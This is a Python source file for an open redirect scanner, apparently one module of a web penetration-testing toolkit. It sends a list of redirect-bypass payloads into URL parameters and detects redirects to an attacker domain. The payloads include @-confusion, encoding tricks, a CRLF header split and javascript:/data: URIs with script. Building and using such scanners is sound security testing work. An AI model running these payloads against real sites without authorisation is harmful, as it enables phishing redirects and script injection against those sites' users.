#!/usr/bin/python3
"""
Open Redirect Scanner.

Tests URL-bearing parameters for unvalidated redirect vulnerabilities.
Covers both reflected (302/301) and meta/JS-based redirects.

Bypass techniques tested:
  - Direct //evil.com, https://evil.com
  - Scheme-relative and backslash variants
  - Subdomain confusion (evil.com.trusted.com, trusted.com.evil.com)
  - URL encoding and double encoding
  - Protocol manipulation (javascript:, data:)
  - Whitelisted-domain bypass patterns
  - @ authority confusion (https://trusted.com@evil.com)

Usage:
  ../.venv/bin/python3 modules/open_redirect.py -u "https://target.com/login?next=FUZZ"
  ../.venv/bin/python3 modules/open_redirect.py -u https://target.com -p next,redirect,url
  ../.venv/bin/python3 modules/open_redirect.py -u https://target.com/redir -p url --evil attacker.io
"""
import argparse
import json
import re
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run
from core.auth_gate import preflight

urllib3.disable_warnings()

TIMEOUT     = 15
UA          = {"User-Agent": "Catch403/1.0"}
DEFAULT_EVIL = "evil-catch403.com"

COMMON_PARAMS = [
    "next", "redirect", "url", "return", "goto", "dest", "destination",
    "target", "link", "back", "forward", "continue", "location", "ref",
    "referrer", "return_to", "returnto", "return_url", "returnurl",
    "redirect_to", "redirectto", "redirect_url", "redirecturl",
    "callback", "path", "r", "u", "to", "site", "open",
]


def _build_payloads(evil: str, trusted: str) -> list[tuple[str, str]]:
    """
    Return list of (label, payload) pairs.
    evil    = attacker-controlled domain (e.g. evil-catch403.com)
    trusted = current target host (for whitelist bypass patterns)
    """
    e = evil
    t = trusted or "trusted.example.com"

    return [
        # ── Direct ────────────────────────────────────────────────────────
        ("Direct HTTPS",               f"https://{e}/"),
        ("Direct HTTP",                f"http://{e}/"),
        ("Scheme-relative //",         f"//{e}/"),
        ("Scheme-relative backslash",  f"\\\\{e}\\"),
        ("Mixed slash",                f"/\\\\//{e}/"),

        # ── Protocol tricks ───────────────────────────────────────────────
        ("JavaScript URI",             f"javascript:alert(1)//https://{t}"),
        ("Data URI",                   f"data:text/html,<script>location='https://{e}'</script>"),
        ("No protocol",                e),

        # ── Whitelist bypass: subdomain of trusted ─────────────────────────
        ("Subdomain of trusted",       f"https://{t}.{e}/"),
        ("Trusted as subdomain",       f"https://{e}.{t}/"),
        ("Trusted as path",            f"https://{e}/{t}"),
        ("@ authority confusion",      f"https://{t}@{e}/"),
        ("Trusted in query",           f"https://{e}/?ref={t}"),

        # ── URL encoding ──────────────────────────────────────────────────
        ("URL-encoded slash",          f"https:%2F%2F{e}/"),
        ("Double-encoded slash",       f"https:%252F%252F{e}/"),
        ("URL-encoded colon",          f"https%3A//{e}/"),
        ("Percent-encoded @",          f"https://{t}%40{e}/"),

        # ── Unicode / IDN ────────────────────────────────────────────────
        ("Unicode backslash",          f"https://{e}\\"),
        ("CR/LF Location split",       f"https://{t}%0d%0aLocation:https://{e}/"),

        # ── Fragment tricks ───────────────────────────────────────────────
        ("Fragment bypass",            f"https://{t}#@{e}/"),
        ("Question mark split",        f"https://{t}?@{e}/"),

        # ── Relative paths ───────────────────────────────────────────────
        ("Relative // path",           f"//{e}"),
        ("Triple slash",               f"///{e}"),
    ]


# ── detection ──────────────────────────────────────────────────────────────

def _redirected_to_evil(r: requests.Response, evil: str) -> tuple[bool, str]:
    """Check if any redirect in the chain points to the evil domain."""
    # Direct Location header
    loc = r.headers.get("Location", "")
    if evil.lower() in loc.lower():
        return True, f"Location: {loc}"

    # Meta refresh
    meta_re = re.search(
        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;\s*url=([^"\'>\s]+)',
        r.text, re.IGNORECASE
    )
    if meta_re and evil.lower() in meta_re.group(1).lower():
        return True, f"Meta refresh: {meta_re.group(1)}"

    # JS window.location redirect
    js_re = re.search(
        r'(?:window\.location|location\.href|location\.replace)\s*[=(]\s*["\']([^"\']+)["\']',
        r.text, re.IGNORECASE
    )
    if js_re and evil.lower() in js_re.group(1).lower():
        return True, f"JS redirect: {js_re.group(1)}"

    # JavaScript: protocol confirmed
    if loc.lower().startswith("javascript:"):
        return True, f"JavaScript URI redirect: {loc[:80]}"

    return False, ""


def _inject(base_url: str, param: str, payload: str) -> str:
    p = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    new_qs = "&".join(
        f"{k}={urllib.parse.quote_plus(v)}" if k != param else f"{k}={payload}"
        for k, vals in qs.items() for v in vals
    )
    return p._replace(query=new_qs).geturl()


def _send(url: str, param: str, payload: str,
          headers: dict) -> requests.Response | None:
    try:
        target = _inject(url, param, payload)
        # Don't follow redirects — we want to inspect the raw 302
        return requests.get(target, headers=headers, timeout=TIMEOUT,
                            verify=False, allow_redirects=False)
    except Exception:
        return None


# ── scan ──────────────────────────────────────────────────────────────────

def scan_param(url: str, param: str, *,
               evil: str = DEFAULT_EVIL,
               headers: dict | None = None) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    parsed = urllib.parse.urlparse(url)
    trusted = parsed.netloc

    payloads = _build_payloads(evil, trusted)
    findings: list[dict] = []

    for label, payload in payloads:
        r = _send(url, param, payload, hdrs)
        if r is None:
            continue
        # Check if it's a redirect status at all
        if r.status_code not in (301, 302, 303, 307, 308):
            # Still might be a JS/meta redirect in a 200
            if r.status_code != 200:
                continue
        found, evidence = _redirected_to_evil(r, evil)
        if found:
            # Check for JS protocol specifically
            is_xss = "javascript:" in payload.lower()
            findings.append({
                "name": "Open Redirect" + (" (XSS via javascript:)" if is_xss else ""),
                "severity": "high" if not is_xss else "critical",
                "detail": (
                    f"Unvalidated redirect via parameter '{param}'.\n"
                    f"Technique: {label}\n"
                    f"Payload: {payload}\n"
                    f"Evidence: {evidence}"
                ),
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": evidence,
                "curl": f'curl -sk -D - "{_inject(url, param, payload)}"',
            })
            break  # confirmed, move to next param

    return findings


def scan(url: str, *,
         params: list[str] | None = None,
         evil: str = DEFAULT_EVIL,
         headers: dict | None = None) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    qs_params = list(urllib.parse.parse_qs(parsed.query).keys())
    target_params = params or qs_params or COMMON_PARAMS

    all_findings: list[dict] = []
    for param in target_params:
        all_findings.extend(scan_param(url, param, evil=evil, headers=headers))

    if not all_findings:
        all_findings.append({
            "name": "No Open Redirect Detected",
            "severity": "info",
            "detail": f"Tested {len(target_params)} parameter(s) — no redirect vulnerabilities found",
        })
    return all_findings


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 Open Redirect Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-p", dest="params", default="",
                        help="Comma-separated param names (default: auto-detect + common list)")
    parser.add_argument("--evil", dest="evil", default=DEFAULT_EVIL,
                        help=f"Attacker domain to redirect to (default: {DEFAULT_EVIL})")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    preflight('open_redirect', args.url, active=True)

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    params = [p.strip() for p in args.params.split(",") if p.strip()] or None

    _p = urllib.parse.urlparse(args.url)
    print(f"{run} Open redirect scan: {bold}{_p.netloc}{_p.path}{end}")
    print(f"{info} Evil domain: {args.evil}")

    results = scan(args.url, params=params, evil=args.evil, headers=custom_headers)

    for f in results:
        sev = f.get("severity", "info")
        icon = bad if sev == "critical" else (f"{bold}[HIGH]{end}" if sev == "high" else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:180]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
